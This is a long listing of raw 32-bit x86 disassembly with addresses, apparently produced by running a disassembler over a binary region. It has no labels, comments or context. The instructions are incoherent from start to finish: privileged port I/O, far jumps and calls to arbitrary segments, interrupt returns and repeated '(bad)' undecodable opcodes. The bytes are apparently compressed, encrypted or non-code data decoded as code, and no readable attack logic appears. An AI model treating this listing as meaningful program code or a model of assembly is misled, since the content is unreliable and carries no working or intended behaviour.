  418dd4:	xchg   ebx,eax
  418dd5:	cmc    
  418dd6:	mov    edi,0xf392036e
  418ddb:	jbe    0x418dae
  418ddd:	and    dl,ch
  418ddf:	add    al,0x8e
  418de1:	or     DWORD PTR [eax+ecx*8],edx
  418de4:	add    BYTE PTR [ebp+0x7ca85a37],ch
  418dea:	fld    st(3)
  418dec:	aad    0x97
  418dee:	jle    0x418df2
  418df0:	aam    0x99
  418df2:	xlat   BYTE PTR ds:[ebx]
  418df3:	iret   
  418df4:	jbe    0x418e38
  418df6:	mov    DWORD PTR [esi],ebp
  418df8:	pop    ecx
  418df9:	stos   DWORD PTR es:[edi],eax
  418dfa:	aaa    
  418dfb:	cld    
  418dfc:	ins    DWORD PTR es:[edi],dx
  418dfd:	push   ebx
  418dfe:	add    eax,0x6db1008d
  418e03:	arpl   bx,ax
  418e05:	dec    edi
  418e06:	pop    ebx
  418e07:	repnz mov bl,0x40
  418e0a:	lahf   
  418e0b:	cmp    DWORD PTR [ecx-0x586c77f7],ecx
  418e11:	adc    BYTE PTR ds:0x9a23267,ah
  418e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e18:	div    DWORD PTR [ecx]
  418e1a:	xchg   ebp,eax
  418e1b:	test   eax,0x76410acb
  418e20:	and    BYTE PTR [ecx+0x7c2f4a54],bh
  418e26:	xlat   BYTE PTR ds:[ebx]
  418e27:	mov    WORD PTR [eax+0x5e3470de],fs
  418e2d:	push   esi
  418e2e:	aaa    
  418e2f:	shr    BYTE PTR [edi],cl
  418e31:	xchg   ecx,eax
  418e32:	mul    esi
  418e34:	adc    dh,BYTE PTR [edx]
  418e36:	call   0x6735:0xf1af5e7d
  418e3d:	inc    ebx
  418e3e:	sbb    al,0x9a
  418e40:	pop    esi
  418e41:	iret   
  418e42:	jl     0x418eb1
  418e44:	pop    ebx
  418e45:	ins    DWORD PTR es:[edi],dx
  418e46:	adc    cl,ah
  418e48:	pop    ss
  418e49:	pop    edi
  418e4a:	or     eax,0x7c9d1c23
  418e4f:	mov    eax,ds:0x402a2135
  418e54:	mov    ebx,0xdce8aa8e
  418e59:	ins    DWORD PTR es:[edi],dx
  418e5a:	pop    edx
  418e5b:	mov    dh,0x63
  418e5d:	ret    
  418e5e:	jmp    0x418e42
  418e60:	jl     0x418ea8
  418e62:	push   0x4d
  418e64:	cld    
  418e65:	cli    
  418e66:	test   al,0xec
  418e68:	out    0x8b,al
  418e6a:	cwde   
  418e6b:	dec    ecx
  418e6c:	mov    DWORD PTR [eiz*8+0x21ff48c5],edx
  418e73:	xchg   edx,eax
  418e74:	leave  
  418e75:	shl    ecx,1
  418e77:	jno    0x418e94
  418e79:	repnz fwait
  418e7b:	lds    eax,FWORD PTR cs:[edi]
  418e7e:	push   edx
  418e7f:	add    DWORD PTR [ebx-0xf57e58f],ebx
  418e85:	adc    DWORD PTR [ebp+0x16227217],ebp
  418e8b:	push   edi
  418e8c:	dec    ecx
  418e8d:	jecxz  0x418ef1
  418e8f:	test   DWORD PTR [eax-0x24c1b88f],ecx
  418e95:	in     eax,0x46
  418e97:	pop    ds
  418e98:	add    al,0x71
  418e9a:	push   cs
  418e9b:	scas   eax,DWORD PTR es:[edi]
  418e9c:	xor    eax,0x913e8cb9
  418ea1:	xchg   cl,ah
  418ea3:	aaa    
  418ea4:	(bad)  
  418ea6:	jge    0x418f23
  418ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ea9:	pop    ds
  418eaa:	jmp    0x418e94
  418eac:	push   esi
  418ead:	fcom   QWORD PTR [ebx]
  418eaf:	dec    esp
  418eb0:	push   ebx
  418eb1:	push   0xf5493ee8
  418eb6:	push   esp
  418eb7:	shl    BYTE PTR [ecx-0x4ea85a07],1
  418ebd:	mov    ?,WORD PTR [edi]
  418ebf:	push   ss
  418ec0:	dec    edx
  418ec1:	jno    0x418f12
  418ec3:	lea    ebx,[edx]
  418ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ec6:	ret    
  418ec7:	and    ebp,DWORD PTR [edi+0x4a]
  418eca:	xor    eax,0xcef88d8d
  418ecf:	fnstsw WORD PTR [edx+0x4a2b90d3]
  418ed5:	out    0x55,al
  418ed7:	repnz sahf 
  418ed9:	xor    al,0x9a
  418edb:	mov    esp,0x9e1ce1cc
  418ee0:	retf   0xd15d
  418ee3:	and    esp,DWORD PTR [edi]
  418ee5:	and    BYTE PTR [edi],dh
  418ee7:	cdq    
  418ee8:	dec    ebp
  418ee9:	sub    eax,0x6c78459
  418eee:	or     BYTE PTR [esi+0x11],dh
  418ef1:	je     0x418f69
  418ef3:	data16 jns 0x418f50
  418ef6:	inc    esp
  418ef7:	into   
  418ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ef9:	cli    
  418efa:	push   edi
  418efb:	xchg   DWORD PTR [edi+edx*1+0x22],ebx
  418eff:	fstp   TBYTE PTR [esi]
  418f01:	pop    es
  418f02:	xchg   BYTE PTR [ecx-0x18d22cc9],ah
  418f08:	mov    esp,0x17a53948
  418f0d:	jns    0x418f43
  418f0f:	test   eax,0x79eaf16a
  418f14:	mov    ecx,0xd2be262
  418f19:	retf   
  418f1a:	stc    
  418f1b:	(bad)  
  418f1c:	fidiv  DWORD PTR [eax]
  418f1e:	sub    cl,BYTE PTR [eax-0x476b9b3a]
  418f24:	(bad)  
  418f25:	icebp  
  418f26:	push   edx
  418f27:	jne    0x418eb8
  418f29:	dec    esp
  418f2a:	gs dec esp
  418f2c:	xchg   edi,eax
  418f2d:	sub    BYTE PTR [ecx],0x68
  418f30:	fmul   st(2),st
  418f32:	int    0xb
  418f34:	mov    eax,ds:0x76b4801b
  418f39:	(bad)  
  418f3c:	imul   edx,DWORD PTR [si],0x51
  418f40:	sub    al,0x62
  418f42:	push   es
  418f43:	inc    ecx
  418f44:	in     eax,dx
  418f45:	scas   eax,DWORD PTR es:[edi]
  418f46:	xor    edx,DWORD PTR [edi+0x730b27ff]
  418f4c:	inc    edx
  418f4d:	ja     0x418ee6
  418f4f:	sbb    al,cl
  418f51:	pop    edx
  418f52:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  418f54:	enter  0x87ba,0xfa
  418f58:	pusha  
  418f59:	fist   DWORD PTR [eax]
  418f5b:	mov    ch,0xa6
  418f5d:	sbb    BYTE PTR [eax],cl
  418f5f:	sbb    esp,ebp
  418f61:	mov    ds:0x767e7d62,al
  418f66:	mov    ah,0xd8
  418f68:	ds js  0x418eeb
  418f6b:	and    BYTE PTR [esp+edi*1+0x6459d38c],al
  418f72:	int    0x9e
  418f74:	push   cs
  418f75:	inc    ebp
  418f76:	pop    ebx
  418f77:	ss dec esi
  418f79:	xor    ah,ch
  418f7b:	jae    0x418f73
  418f7d:	icebp  
  418f7e:	in     eax,0x39
  418f80:	sub    al,bl
  418f82:	sub    DWORD PTR [ecx],esp
  418f84:	fwait
  418f85:	add    eax,0xcf34424
  418f8a:	and    al,BYTE PTR [ebx+0x2c]
  418f8d:	mov    ecx,0xff31240f
  418f92:	push   ecx
  418f93:	sbb    esi,DWORD PTR [esi+eiz*2]
  418f96:	or     DWORD PTR [edi],ecx
  418f98:	sub    DWORD PTR [edi],esi
  418f9a:	bound  edx,QWORD PTR [edi+edx*2-0x11]
  418f9e:	std    
  418f9f:	mov    ebx,DWORD PTR ds:0xcdba4c87
  418fa5:	stos   BYTE PTR es:[edi],al
  418fa6:	int3   
  418fa7:	push   esi
  418fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fa9:	lahf   
  418faa:	dec    ebx
  418fab:	cmp    bh,al
  418fad:	mov    ds:0x9467eb0d,al
  418fb2:	popf   
  418fb3:	jle    0x41900b
  418fb5:	ret    
  418fb6:	jl     0x418fbe
  418fb8:	xchg   edi,eax
  418fb9:	adc    dl,bl
  418fbb:	mov    edi,DWORD PTR [esi+0x3ccb0ba]
  418fc1:	repnz rcl DWORD PTR [esi+edx*2+0x3e6e34ba],0x19
  418fca:	mov    ecx,0x9df87701
  418fcf:	push   esi
  418fd0:	xchg   ecx,eax
  418fd1:	ins    BYTE PTR es:[edi],dx
  418fd2:	imul   esp,DWORD PTR [ebx-0x7c1d97de],0xedbc2f5f
  418fdc:	add    eax,0xbc586f
  418fe1:	or     dh,BYTE PTR cs:[edx-0x7d]
  418fe5:	jmp    0x419012
  418fe7:	xchg   esp,eax
  418fe8:	sub    cl,cl
  418fea:	(bad)  [ebx+0x3865f5b0]
  418ff0:	dec    ebx
  418ff1:	mov    cl,0xc8
  418ff3:	lea    ebx,[edi]
  418ff5:	aas    
  418ff6:	sbb    DWORD PTR [ebx+edx*4+0x41],eax
  418ffa:	mov    DWORD PTR fs:[esi+0x40d2ee56],ebp
  419001:	ins    WORD PTR es:[edi],dx
  419003:	int3   
  419004:	shr    DWORD PTR [eax-0x28b98599],0xa2
  41900b:	and    DWORD PTR [edx],eax
  41900d:	sbb    dl,BYTE PTR [eax]
  41900f:	sbb    esp,DWORD PTR [edi]
  419011:	cwde   
  419012:	shl    DWORD PTR fs:[ebx-0x3a],1
  419016:	dec    esi
  419017:	sub    eax,0x254b74df
  41901c:	add    DWORD PTR [edx],esi
  41901e:	aaa    
  41901f:	sub    DWORD PTR [ecx-0x6c],ebx
  419022:	lahf   
  419023:	ins    BYTE PTR es:[edi],dx
  419024:	dec    ebp
  419025:	xchg   esi,eax
  419026:	xchg   edx,eax
  419027:	jmp    0xcee:0x95a2f36d
  41902e:	enter  0xbca1,0x6b
  419032:	jnp    0x41903d
  419034:	ins    BYTE PTR es:[edi],dx
  419035:	mov    eax,ebp
  419037:	adc    al,0x6a
  419039:	push   0x54
  41903b:	dec    ebp
  41903c:	push   0x42
  41903e:	fidiv  DWORD PTR [ebx-0x3917a004]
  419044:	sub    BYTE PTR [edi],bl
  419046:	cmp    al,BYTE PTR [eax-0x15]
  419049:	cmp    eax,0x5e113268
  41904e:	mov    esi,?
  419050:	jns    0x419032
  419052:	adc    ch,BYTE PTR [esi+ecx*1-0xff44df2]
  419059:	cmp    ebp,ebp
  41905b:	or     edx,DWORD PTR ds:0xe70eee5c
  419061:	mov    WORD PTR [eax],?
  419063:	enter  0x483f,0xc2
  419067:	jmp    0xb5fa:0x2362f37c
  41906e:	mov    al,ds:0xd4e2cdc9
  419073:	aaa    
  419074:	mov    esi,0x7bc3b54f
  419079:	aam    0xd
  41907b:	mov    BYTE PTR [edi],cl
  41907d:	cmc    
  41907e:	pop    edi
  41907f:	sbb    dl,dh
  419081:	add    esi,ebx
  419083:	mul    BYTE PTR [esi+0x6708eb81]
  419089:	rol    BYTE PTR [eax+ecx*4+0x28500367],1
  419090:	test   BYTE PTR [edx],ch
  419092:	fisttp QWORD PTR ds:0x4083955f
  419098:	mov    ds:0x74bc1197,eax
  41909d:	inc    eax
  41909e:	sub    edi,DWORD PTR [ebx-0x73]
  4190a1:	push   es
  4190a2:	stc    
  4190a3:	cmp    eax,0xcf8f9dbc
  4190a8:	adc    eax,0xcfd0f8f
  4190ad:	cmp    ch,bh
  4190af:	xor    DWORD PTR [ebx-0x59],ebp
  4190b2:	or     DWORD PTR [eax-0x7e54ebd1],0xfffffff7
  4190b9:	mov    ebx,0xec64cb27
  4190be:	mov    DWORD PTR [eax-0x2b],ebp
  4190c1:	fdiv   QWORD PTR [edi+0x7f]
  4190c4:	and    al,0xe4
  4190c6:	sbb    cl,dh
  4190c8:	cmp    ecx,DWORD PTR [edx+0x5]
  4190cb:	lock dec edi
  4190cd:	xor    al,0x4e
  4190cf:	lea    ebx,[esi+0x573aaea]
  4190d5:	iret   
  4190d6:	sbb    DWORD PTR [eax],edi
  4190d8:	xchg   DWORD PTR [ebx+0x50dd876c],edx
  4190de:	test   al,0x40
  4190e0:	inc    ecx
  4190e1:	lahf   
  4190e2:	or     edx,DWORD PTR [edi+0x31]
  4190e5:	ds push esp
  4190e7:	addr16 aaa 
  4190e9:	pop    esp
  4190ea:	(bad)  
  4190ec:	mov    ch,0x86
  4190ee:	ret    0xd282
  4190f1:	sahf   
  4190f2:	fbstp  TBYTE PTR [eax]
  4190f4:	dec    edi
  4190f5:	adc    edx,DWORD PTR [ebx+0x36e73b57]
  4190fb:	pop    ecx
  4190fc:	add    BYTE PTR [edx],dh
  4190fe:	jo     0x41917f
  419100:	(bad)  
  419101:	inc    DWORD PTR [ebp+0x14]
  419104:	stos   BYTE PTR es:[edi],al
  419105:	fldenv [edi]
  419107:	and    BYTE PTR [ebp+0x4db3d355],cl
  41910d:	sbb    DWORD PTR [edx],edi
  41910f:	ja     0x4190e5
  419111:	mov    al,0xaf
  419113:	cli    
  419114:	adc    al,0x1a
  419116:	cwde   
  419117:	push   ecx
  419118:	adc    al,BYTE PTR [esi]
  41911a:	mov    ah,0xce
  41911c:	idiv   eax
  41911e:	cmp    DWORD PTR ds:0x37497d86,esp
  419124:	fyl2xp1 
  419126:	lods   eax,DWORD PTR ds:[esi]
  419127:	dec    esp
  419128:	ror    BYTE PTR [ecx],0x64
  41912b:	popf   
  41912c:	pop    esp
  41912d:	(bad)  
  41912e:	in     eax,0xf5
  419130:	ins    DWORD PTR es:[edi],dx
  419131:	xor    cl,al
  419133:	dec    ecx
  419134:	icebp  
  419135:	cdq    
  419136:	aas    
  419137:	mov    ds:0xa15dddfd,al
  41913c:	lods   eax,DWORD PTR ds:[esi]
  41913d:	xor    DWORD PTR [esi],0x47075cf5
  419143:	or     BYTE PTR [edi],ah
  419145:	xor    BYTE PTR [ebp+0xe4ef50b],0x76
  41914c:	mov    esp,0x7f242a87
  419151:	mov    BYTE PTR [eax-0x1a],ah
  419154:	mov    eax,ds:0x3a5fedfa
  419159:	dec    edx
  41915a:	push   edx
  41915b:	rcl    ebp,0x78
  41915e:	sbb    al,0xe6
  419160:	push   ss
  419161:	mov    al,ds:0x2f9cea36
  419166:	or     eax,0x8c079155
  41916b:	fsubp  st(0),st
  41916d:	enter  0x28e5,0x90
  419171:	jns    0x419185
  419173:	add    ebx,DWORD PTR [edx-0x368062c3]
  419179:	fadd   QWORD PTR [ebx+0x17de470f]
  41917f:	mov    WORD PTR [eax],?
  419181:	mov    ebp,0x26fef0ac
  419186:	(bad)  
  419188:	mov    bl,0x99
  41918a:	lds    edx,FWORD PTR [eax+0x36]
  41918d:	dec    edx
  41918e:	push   edi
  41918f:	cmp    ah,BYTE PTR [ebx-0x2a5817a3]
  419195:	das    
  419196:	(bad)  
  419197:	push   ecx
  419198:	cmp    ecx,DWORD PTR [ebp+0x7e]
  41919b:	pop    ecx
  41919c:	and    esp,esi
  41919e:	addr16 out dx,al
  4191a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191a1:	sbb    BYTE PTR ds:0x6ab9cb89,dh
  4191a7:	iret   
  4191a8:	sbb    BYTE PTR ds:0x74a0e00a,ch
  4191ae:	scas   eax,DWORD PTR es:[edi]
  4191af:	jne    0x4191a5
  4191b1:	jp     0x4191df
  4191b3:	add    cl,bl
  4191b5:	in     al,0x65
  4191b7:	mov    bl,bl
  4191b9:	ds cmc 
  4191bb:	(bad)  [ebx]
  4191bd:	pop    ebp
  4191be:	sub    eax,0x954d43f3
  4191c3:	jl     0x419149
  4191c5:	sahf   
  4191c6:	rcl    BYTE PTR [esi-0x2f],cl
  4191c9:	sub    BYTE PTR [edx+0x4ea78427],0x4
  4191d0:	jmp    0x98c5c2b
  4191d5:	call   0x591e3f5e
  4191da:	dec    edx
  4191db:	mov    WORD PTR [ecx+0xb],ss
  4191de:	lahf   
  4191df:	fmul   st,st(1)
  4191e1:	out    0xc8,eax
  4191e3:	sub    al,0x59
  4191e5:	adc    ah,BYTE PTR [ecx-0x3c]
  4191e8:	add    ecx,DWORD PTR [esi-0x45]
  4191eb:	fdiv   DWORD PTR [edi+0x6222efa9]
  4191f1:	dec    esi
  4191f2:	cmc    
  4191f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191f4:	xchg   edi,eax
  4191f5:	or     dl,bl
  4191f7:	add    BYTE PTR [edi+ebx*8],al
  4191fa:	call   0xc79f:0x32e68faa
  419201:	leave  
  419202:	mov    bh,BYTE PTR [edi+0x69]
  419205:	outs   dx,BYTE PTR ds:[esi]
  419206:	ins    BYTE PTR es:[edi],dx
  419207:	or     dh,dl
  419209:	adc    DWORD PTR [ecx+eax*4+0x66],edx
  41920d:	mov    bh,0x6d
  41920f:	add    al,0x31
  419211:	outs   dx,BYTE PTR ds:[esi]
  419212:	push   eax
  419213:	cld    
  419214:	test   BYTE PTR [esi],0xf
  419217:	or     eax,0x3e0b37ff
  41921c:	dec    esp
  41921d:	cwde   
  41921e:	lods   eax,DWORD PTR ds:[esi]
  41921f:	out    0x65,al
  419221:	pop    ebp
  419222:	jae    0x4191fb
  419224:	sub    edx,DWORD PTR [esi-0x2991464c]
  41922a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41922b:	fisub  DWORD PTR [edi+0x30cbce69]
  419231:	jle    0x419260
  419233:	nop
  419234:	call   0x4f14:0xc91dd1f7
  41923b:	xchg   edx,eax
  41923c:	aaa    
  41923d:	scas   al,BYTE PTR es:[edi]
  41923e:	test   eax,esp
  419240:	mov    DWORD PTR [esi],esp
  419242:	xor    eax,0x5e5cbeb1
  419247:	mov    ecx,0x73f903ea
  41924c:	sub    eax,0xc66f9d0a
  419251:	arpl   WORD PTR [edi],di
  419253:	neg    BYTE PTR [eax+ecx*8+0x6f]
  419257:	xchg   ebx,eax
  419258:	mov    ds:0x14b522c0,al
  41925d:	jp     0x4191f6
  41925f:	jle    0x419223
  419261:	imul   edi,DWORD PTR [edx],0xffffffee
  419264:	sbb    eax,0x7cb1e390
  419269:	mov    esp,0xff5a288a
  41926e:	dec    ecx
  41926f:	stos   BYTE PTR es:[edi],al
  419270:	jge    0x419248
  419272:	push   ss
  419273:	(bad)  
  419274:	mov    al,ds:0x72a43afc
  419279:	ret    
  41927a:	inc    ecx
  41927b:	nop
  41927c:	xchg   ebx,eax
  41927d:	ins    DWORD PTR es:[edi],dx
  41927e:	ret    
  41927f:	dec    esp
  419280:	cmp    eax,0x8779e326
  419285:	push   edx
  419286:	jl     0x41926f
  419288:	pop    ds
  419289:	mov    ch,0x86
  41928b:	dec    edi
  41928c:	push   edx
  41928d:	out    0x3c,al
  41928f:	int3   
  419290:	sbb    dh,BYTE PTR [eax+edx*2-0x6a]
  419294:	push   0xd60e4fd6
  419299:	(bad)  
  41929a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41929b:	clc    
  41929c:	jnp    0x41928b
  41929e:	(bad)  
  41929f:	scas   eax,DWORD PTR es:[edi]
  4192a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192a1:	jmp    0x41923c
  4192a3:	cmp    BYTE PTR ds:0x63be3b93,al
  4192a9:	pusha  
  4192aa:	fist   WORD PTR [eax+0x68]
  4192ad:	cmp    al,0xe2
  4192af:	cdq    
  4192b0:	mov    edi,0xdac58bcd
  4192b5:	ret    
  4192b6:	mov    ds:0x8f49be28,eax
  4192bb:	out    dx,eax
  4192bc:	sub    BYTE PTR [ecx],0x38
  4192bf:	aas    
  4192c0:	cmp    BYTE PTR [ecx],0xa2
  4192c3:	cmp    dh,0xb2
  4192c6:	or     esp,DWORD PTR [ebx]
  4192c8:	in     al,dx
  4192c9:	lds    ecx,FWORD PTR [eax+0x3626858f]
  4192cf:	or     al,0x2
  4192d1:	dec    ebp
  4192d2:	pop    ds
  4192d3:	mov    ah,0xa3
  4192d5:	mov    ah,0x3
  4192d7:	jl     0x4192ae
  4192d9:	ror    ecx,0x18
  4192dc:	pop    ebp
  4192dd:	cmp    bl,0x27
  4192e0:	mov    bl,0x32
  4192e2:	mov    eax,0xc4094bac
  4192e7:	(bad)  
  4192e9:	test   al,0x3b
  4192eb:	add    al,0xc
  4192ed:	dec    ebp
  4192ee:	in     eax,dx
  4192ef:	inc    eax
  4192f0:	dec    ecx
  4192f1:	ret    
  4192f2:	cmc    
  4192f3:	in     al,0x28
  4192f5:	pop    esi
  4192f6:	inc    esi
  4192f7:	mov    al,ds:0xec8b7f61
  4192fc:	into   
  4192fd:	jecxz  0x419326
  4192ff:	push   es
  419300:	fldenv [ecx-0x74]
  419303:	inc    ebp
  419304:	and    eax,0xf991322
  419309:	sub    ch,BYTE PTR [ebp+0x4c]
  41930c:	xor    DWORD PTR [ebx+0x70],0x0
  419310:	sbb    DWORD PTR [edi],esp
  419312:	pop    ecx
  419313:	inc    ebx
  419314:	push   eax
  419315:	outs   dx,BYTE PTR ds:[esi]
  419316:	add    DWORD PTR [edx],edx
  419318:	lds    eax,FWORD PTR ds:0xd069296a
  41931e:	test   BYTE PTR [edi+0x7a7c457b],0xc9
  419325:	adc    bl,BYTE PTR [esi-0x489c150f]
  41932b:	sub    al,0x8
  41932d:	lahf   
  41932e:	mov    al,0x36
  419330:	dec    ebx
  419331:	xchg   edi,eax
  419332:	mov    DWORD PTR [edi],ebx
  419334:	and    al,0x65
  419336:	cwde   
  419337:	fld    DWORD PTR [esi+0x0]
  41933a:	and    ebp,DWORD PTR [ecx]
  41933c:	dec    esp
  41933d:	stos   BYTE PTR es:[edi],al
  41933e:	arpl   WORD PTR [ecx+eax*2+0x30],si
  419342:	xchg   ecx,eax
  419343:	ins    DWORD PTR es:[edi],dx
  419344:	loope  0x4192d5
  419346:	push   ebx
  419347:	jb     0x41939e
  419349:	inc    esi
  41934a:	jp     0x4192ff
  41934c:	push   ebx
  41934d:	fldenv [ebp-0x4d1344b6]
  419353:	xor    ebx,0xffffffb1
  419356:	or     eax,esi
  419358:	xchg   edi,eax
  419359:	sbb    eax,0x3df22ce4
  41935e:	add    DWORD PTR [ebx+0x55],esi
  419361:	gs jmp 0x3b4:0x7018e42
  419369:	xor    DWORD PTR [eax],edx
  41936b:	mov    bh,0x62
  41936d:	fs cs push 0x1b25d15a
  419374:	cmp    BYTE PTR [ecx+0x50],0xf6
  419378:	jp     0x41938b
  41937a:	push   edx
  41937b:	sbb    al,0xb5
  41937d:	les    edi,FWORD PTR [ebx]
  41937f:	and    eax,0x5d35135d
  419384:	mov    bh,BYTE PTR [ebp-0x5]
  419387:	rol    DWORD PTR [ebp-0x5d7bb1c7],0x73
  41938e:	pop    es
  41938f:	cmp    ebx,edx
  419391:	lods   al,BYTE PTR ds:[esi]
  419392:	call   0xbfe72764
  419397:	mov    DWORD PTR [edx-0x34],edx
  41939a:	jg     0x419335
  41939c:	pushf  
  41939d:	stc    
  41939e:	out    dx,al
  41939f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193a0:	mov    ch,0xe2
  4193a2:	mov    ah,0xa4
  4193a4:	imul   edx,DWORD PTR [esi+edi*8],0xffffffa7
  4193a8:	icebp  
  4193a9:	mov    edx,0x5ae57714
  4193ae:	stc    
  4193af:	mov    edx,0xd6719339
  4193b4:	mov    ecx,ds
  4193b6:	mov    cl,BYTE PTR [ebx]
  4193b8:	jne    0x419358
  4193ba:	jae    0x419419
  4193bc:	sub    BYTE PTR [eax-0x3d39b4f5],ch
  4193c2:	sbb    eax,0xa4a3af4f
  4193c7:	sub    al,0xb4
  4193c9:	mov    bh,0xb2
  4193cb:	daa    
  4193cc:	dec    edi
  4193cd:	jecxz  0x419416
  4193cf:	fwait
  4193d0:	cld    
  4193d1:	out    0xb,al
  4193d3:	loopne 0x419413
  4193d5:	mov    ebx,0x37322c0b
  4193da:	push   ebx
  4193db:	mov    cl,0x98
  4193dd:	sahf   
  4193de:	push   esi
  4193df:	dec    edx
  4193e0:	shl    eax,1
  4193e2:	aaa    
  4193e3:	push   ebp
  4193e4:	daa    
  4193e5:	sbb    eax,0x54f4ed18
  4193ea:	xor    eax,0xaf353ed8
  4193ef:	out    dx,al
  4193f0:	or     eax,0xed5a5e3f
  4193f5:	imul   BYTE PTR [ebx]
  4193f7:	fist   DWORD PTR [eax]
  4193f9:	call   0x5d7b549d
  4193fe:	xlat   BYTE PTR ds:[ebx]
  4193ff:	xor    ch,BYTE PTR [ebx+0x22]
  419402:	pop    ecx
  419403:	(bad)  
  419404:	jg     0x41946b
  419406:	lahf   
  419407:	inc    eax
  419408:	cmp    al,0xc2
  41940a:	sbb    ebp,edx
  41940c:	in     eax,dx
  41940d:	mov    dl,0xcd
  41940f:	jmp    DWORD PTR ds:0x31c02afd
  419415:	sbb    edi,esi
  419417:	pushf  
  419418:	inc    edx
  419419:	ret    
  41941a:	jae    0x419469
  41941c:	pop    ax
  41941e:	shr    ebp,0xfe
  419421:	loope  0x419487
  419423:	mov    esp,0x7515a37f
  419428:	adc    bh,BYTE PTR [ecx+0x4d]
  41942b:	sti    
  41942c:	pop    esp
  41942d:	imul   ebp,DWORD PTR [edx+esi*4+0x788d9cb4],0x34485e96
  419438:	in     al,dx
  419439:	scas   al,BYTE PTR es:[edi]
  41943a:	or     DWORD PTR [eax-0x53],0xffffffcf
  41943e:	cmp    ah,BYTE PTR ss:[edx+edx*1]
  419442:	jnp    0x41942a
  419444:	adc    ecx,DWORD PTR [edi-0x18fc72b4]
  41944a:	repz xor eax,0x3588727c
  419450:	cmp    al,dh
  419452:	adc    al,0x5a
  419454:	sbb    DWORD PTR [ebp-0x35],0x70
  419458:	das    
  419459:	jbe    0x41941f
  41945b:	jge    0x419480
  41945d:	dec    ebp
  41945e:	mov    ebx,0x33ebe4c2
  419463:	repnz sbb al,0x4b
  419466:	lock and BYTE PTR [eax+ebp*4],0xd0
  41946b:	ins    BYTE PTR es:[edi],dx
  41946c:	cmp    bl,BYTE PTR [ecx+0x58d26cc7]
  419472:	outs   dx,BYTE PTR ds:[esi]
  419473:	fistp  WORD PTR [ebx-0x7a]
  419476:	mov    es,WORD PTR [ebx-0x16]
  419479:	fiadd  WORD PTR [ecx-0x7967082f]
  41947f:	movaps xmm4,xmm0
  419482:	jge    0x4194d4
  419484:	mov    bl,0xe6
  419486:	daa    
  419487:	mov    edi,db3
  41948a:	inc    edx
  41948b:	sbb    eax,0x1b089ea1
  419490:	ja     0x419486
  419492:	dec    ebp
  419493:	add    eax,0xc89d79f
  419498:	cmp    DWORD PTR [ecx-0x460462c1],0x14
  41949f:	loope  0x419456
  4194a1:	cdq    
  4194a2:	adc    eax,0x635a23da
  4194a7:	ins    BYTE PTR es:[edi],dx
  4194a8:	cmp    DWORD PTR [eax-0x66],edi
  4194ab:	add    BYTE PTR [edi-0x798779d4],dl
  4194b1:	test   DWORD PTR [ebp+esi*4+0x67986dc4],ecx
  4194b8:	cld    
  4194b9:	sbb    esi,esp
  4194bb:	cmp    cl,BYTE PTR [edi]
  4194bd:	pop    ebp
  4194be:	mov    al,ds:0xb63eb30a
  4194c3:	cdq    
  4194c4:	fst    QWORD PTR [edx+0x70]
  4194c7:	pop    es
  4194c8:	das    
  4194c9:	add    edi,DWORD PTR [esi-0x4b6f5339]
  4194cf:	ror    DWORD PTR [edi+0x4af352d7],1
  4194d5:	push   ebp
  4194d6:	sbb    eax,0xe40833ec
  4194db:	jmp    0x4194ce
  4194dd:	loope  0x419521
  4194df:	les    edx,FWORD PTR [eax+0x32]
  4194e2:	xor    al,0x54
  4194e4:	sub    cl,BYTE PTR [edx]
  4194e6:	fiadd  DWORD PTR [eax+0x104a67e9]
  4194ec:	repz fcomi st,st(2)
  4194ef:	mov    eax,ds:0xaa60fe90
  4194f4:	mov    esi,0x7165168f
  4194f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194fa:	mov    dl,0xb1
  4194fc:	sbb    al,0xbf
  4194fe:	pushf  
  4194ff:	xchg   ecx,eax
  419500:	push   edx
  419501:	mov    ch,0xc
  419503:	mov    edx,0x645a9eac
  419508:	(bad)  
  419509:	mov    dh,0x7e
  41950b:	sub    DWORD PTR [ebx-0x4f18db79],0xffffffd4
  419512:	fs add al,0xc3
  419515:	or     esi,DWORD PTR [ebx]
  419517:	fucomi st,st(2)
  419519:	sub    al,0x7f
  41951b:	fsubr  st(2),st
  41951d:	push   cs
  41951e:	mov    ds:0xafa0eb6b,eax
  419523:	sbb    esi,edi
  419525:	jecxz  0x4194ee
  419527:	adc    DWORD PTR ss:[esi-0x2e],eax
  41952b:	outs   dx,DWORD PTR ds:[esi]
  41952c:	ss push cs
  41952e:	cmp    al,0xbb
  419530:	mov    eax,0x754576e5
  419535:	ins    DWORD PTR es:[edi],dx
  419536:	dec    ebp
  419537:	nop
  419538:	shr    DWORD PTR [ecx],cl
  41953a:	push   0xffffff9e
  41953c:	push   esi
  41953d:	aas    
  41953e:	jae    0x41957a
  419540:	xchg   bh,bh
  419542:	call   FWORD PTR [eax-0x373866fb]
  419548:	xchg   ebp,eax
  419549:	daa    
  41954a:	in     eax,dx
  41954b:	pop    esi
  41954d:	jne    0x419593
  41954f:	xchg   ecx,eax
  419550:	cmp    BYTE PTR [edx+0x14f03105],cl
  419556:	rcr    ebx,0x79
  419559:	loope  0x419509
  41955b:	jmp    0x419582
  41955d:	sbb    DWORD PTR ds:0xf63df82f,esi
  419563:	popa   
  419564:	push   esp
  419565:	xor    al,0xc5
  419567:	jmp    0xc1187713
  41956c:	sti    
  41956d:	inc    eax
  41956e:	or     eax,0xef5a4943
  419573:	pop    eax
  419574:	push   ebp
  419575:	in     eax,dx
  419576:	push   edi
  419577:	fmul   st(1),st
  419579:	push   esi
  41957a:	test   edi,0x9bcf1df4
  419580:	lea    ecx,[edx-0x46]
  419583:	cld    
  419584:	xlat   BYTE PTR ss:[ebx]
  419586:	fidiv  DWORD PTR [eax+0x62]
  419589:	mov    WORD PTR [ecx-0x217c8dcd],ss
  41958f:	cmc    
  419590:	adc    al,0x48
